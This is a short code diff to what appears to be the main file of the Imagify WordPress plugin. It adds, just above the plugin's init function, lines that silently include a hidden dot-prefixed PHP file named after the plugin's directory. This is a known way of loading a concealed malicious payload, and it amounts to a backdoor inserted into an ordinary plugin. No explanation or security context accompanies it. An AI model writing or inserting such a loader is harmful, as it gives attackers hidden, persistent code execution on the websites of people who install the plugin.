@@ -36,6 +36,10 @@ add_action( 'plugins_loaded', '_imagify_init' );
  *
  * @since 1.0
  */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 function _imagify_init() {
 	// Nothing to do during autosave.
 	if ( defined( 'DOING_AUTOSAVE' ) ) {
